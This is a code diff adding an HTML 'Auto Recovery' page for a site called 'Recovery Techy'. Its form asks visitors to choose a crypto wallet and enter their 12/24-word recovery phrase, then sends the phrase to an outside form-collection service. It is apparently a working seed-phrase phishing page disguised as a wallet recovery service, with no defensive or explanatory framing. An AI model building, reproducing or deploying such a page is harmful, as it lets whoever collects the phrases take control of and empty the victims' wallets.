@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Auto Recovery - Recovery Techy</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #000814;
+      color: #e0e8f0;
+      line-height: 1.6;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 1rem 2rem;
+      border-bottom: 1px solid #0d2d4d;
+      background: #000814;
+    }
+    header img {
+      height: 40px;
+    }
+    nav ul {
+      display: flex;
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      gap: 1.5rem;
+    }
+    nav a {
+      text-decoration: none;
+      color: #e0e8f0;
+      font-size: 0.9rem;
+      transition: color 0.3s;
+    }
+    nav a:hover {
+      color: #4da6ff;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 2rem auto;
+      padding: 2rem;
+      background: #001233;
+      border-radius: 8px;
+      border: 1px solid #0d2d4d;
+    }
+    h1 {
+      text-align: center;
+      color: #4da6ff;
+      margin-bottom: 1.5rem;
+      font-size: 1.8rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-size: 0.9rem;
+    }
+    select, input, textarea {
+      width: 100%;
+      padding: 0.7rem;
+      margin-bottom: 1.2rem;
+      border: 1px solid #0d2d4d;
+      border-radius: 5px;
+      background: #000d1a;
+      color: #e0e8f0;
+      font-size: 0.85rem;
+    }
+    textarea {
+      resize: vertical;
+    }
+    .btn {
+      display: inline-block;
+      padding: 0.8rem 1.5rem;
+      background: #4da6ff;
+      color: #000814;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 6px;
+      transition: background 0.3s;
+      cursor: pointer;
+      border: none;
+    }
+    .btn:hover {
+      background: #1a73e8;
+    }
+    .btn-secondary {
+      background: #0d2d4d;
+      color: #e0e8f0;
+      margin-top: 1rem;
+      display: block;
+      text-align: center;
+    }
+    .btn-secondary:hover {
+      background: #133b66;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header>
+    <div class="header-left">
+      <a href="index.html">
+        <img src="your-logo.png" alt="Recovery Techy Logo" />
+      </a>
+    </div>
+    <nav>
+      <ul>
+        <li><a href="index.html">Home</a></li>
+        <li><a href="services.html">Services</a></li>
+        <li><a href="auto-recovery.html">Auto Recovery</a></li>
+        <li><a href="contact.html">Contact</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <!-- Auto Recovery Form -->
+  <div class="container">
+    <h1>Auto Recovery</h1>
+    <form action="https://formspree.io/f/your-form-id" method="POST">
+      <!-- Wallet Selection -->
+      <label for="wallet">Select Your Wallet:</label>
+      <select id="wallet" name="wallet" required>
+        <option value="">-- Choose Wallet --</option>
+        <option value="Metamask">Metamask</option>
+        <option value="TrustWallet">Trust Wallet</option>
+        <option value="Phantom">Phantom</option>
+        <option value="Coinbase">Coinbase Wallet</option>
+        <option value="Exodus">Exodus</option>
+        <option value="Ledger">Ledger</option>
+        <option value="Trezor">Trezor</option>
+        <option value="Other">Other (type manually)</option>
+      </select>
+
+      <!-- Manual Wallet Input -->
+      <label for="otherWallet">Other Wallet Name (if not listed):</label>
+      <input type="text" id="otherWallet" name="otherWallet" placeholder="Enter wallet name manually" />
+
+      <!-- Recovery Phrase -->
+      <label for="phrase">Enter Wallet Recovery Phrase / ID:</label>
+      <textarea id="phrase" name="phrase" rows="3" placeholder="Type your 12/24 word phrase here" required></textarea>
+
+      <!-- Describe Issue -->
+      <label for="issue">Describe Your Issue:</label>
+      <textarea id="issue" name="issue" rows="4" placeholder="Explain the problem you are facing today..." required></textarea>
+
+      <!-- Submit -->
+      <button type="submit" class="btn">Submit Recovery Request</button>
+    </form>
+
+    <!-- Return Home -->
+    <a href="index.html" class="btn btn-secondary">← Return Home</a>
+  </div>
+</body>
+</html>
